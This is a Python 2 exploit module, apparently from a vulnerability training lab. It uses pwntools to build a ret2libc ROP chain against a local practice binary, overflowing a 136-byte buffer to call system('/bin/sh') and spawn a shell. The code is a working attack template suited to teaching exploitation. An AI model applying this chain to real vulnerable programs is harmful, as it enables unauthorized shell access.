#! /usr/bin/python
#coding:utf-8
import socket
import struct
import sys
sys.path.append("../..")
from modules import exploit
from vulnerabilities import *
from pwn import *
class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'rop'
       # self.payload = ''
        self.payload_info = 'DEP ALSR ON'
        self.info = 'Exploit for ROP.'
        self.property = {'ret':0x0000000000021102, 'offset':136} #gadget address
        self.options={}
        self.vulnerability= 'ROP'

    def run(self):
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('../../vulnerabilities/rop/ggtest')

        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

        pop_ret_offset = self.property['ret'] - libc.symbols['system']
        print "pop_ret_offset = " + hex(pop_ret_offset)

        print "\n##########receiving system addr##########\n"
        system_addr_str =p.recvuntil('\n')
        system_addr = int(system_addr_str,16)
        print "system_addr = " + hex(system_addr)

        binsh_addr = system_addr + binsh_addr_offset
        print "binsh_addr = " + hex(binsh_addr)

        pop_ret_addr = system_addr + pop_ret_offset
        print "pop_ret_addr = " + hex(pop_ret_addr)

        p.recv()

        payload = "a"*self.property['offset'] + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 
        print "\n##########sending payload##########\n"
        p.send(payload)
        p.interactive()
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()
